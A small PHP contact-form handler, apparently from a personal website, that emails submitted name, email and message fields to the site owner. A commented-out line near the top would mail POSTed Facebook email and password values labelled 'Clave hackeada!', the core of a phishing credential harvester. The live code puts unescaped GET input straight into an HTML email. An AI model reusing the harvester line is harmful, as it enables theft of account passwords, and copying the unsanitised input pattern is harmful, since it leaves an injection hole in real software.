<?php
    //echo $_POST["email"];
    //echo $_POST["pass"];

    //mail("lcondori@gmail.com","Clave hackeada!","Estas son las credenciales de Facebook<br> email: ".$_POST["email"]."<br> Pass: ".$_POST["pass"]);

    if(!isset($_GET["name"])){
        echo 'Error interno';
        exit;
    }

    if(!isset($_GET["name"])){
        echo 'Error interno';
        exit;
    }

    if(!isset($_GET["name"])){
        echo 'Error interno';
        exit;           
    }

$destinatario = "lcondori@gmail.com"; 
$asunto = "Un nuevo mensaje desde la web!"; 
$cuerpo = ' 
            <html> 
            <head> 
            <title>Un nuevo mensaje</title> 
            </head> 
            <body> 
            <h1>Respondé rápido...</h1> 
                <p> 
                Estos son los datos ingresados.<br>
                Nombre: '.$_GET["name"].'<br>
                Email: '.$_GET["email"].'<br>
                Mensaje: '.$_GET["msj"].'<br> 
                </p> 
            </body> 
            </html> 
        '; 

//para el envío en formato HTML 
$headers = "MIME-Version: 1.0\r\n"; 
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n"; 

//dirección del remitente 
$headers .= "From: Leo on Web <info@leocondori.com.ar>\r\n"; 

//dirección de respuesta, si queremos que sea distinta que la del remitente 
//$headers .= "Reply-To: mariano@desarrolloweb.com\r\n"; 

//ruta del mensaje desde origen a destino 
//$headers .= "Return-path: holahola@desarrolloweb.com\r\n"; 

//direcciones que recibián copia 
//$headers .= "Cc: maria@desarrolloweb.com\r\n"; 

//direcciones que recibirán copia oculta 
//$headers .= "Bcc: lcondori@gmail.com\r\n"; 

if(!mail($destinatario,$asunto,$cuerpo,$headers)){
    //echo 'Por favor, volvé a presionar el botón enviar.';
    //echo '<script type="text/javascript">$("#log").html("Por favor, volvé a presionar el botón enviar.");</script>';
    echo json_encode( array("statusSendMail"=> 1, "Mensaje"=>"No pudimos enviar el mail. Por favor, volvé a presionar el botón enviar." ) );
}else{
    //echo '<script type="text/javascript">$("#log").html("Mensaje enviado, en breve te voy a responder, te vas a sorprender."); $("#sendMessage").hide();</script>';
    echo json_encode( array("statusSendMail"=> 0, "Mensaje"=>"Mensaje enviado, en breve te voy a responder, te vas a sorprender." ) );
}     
?>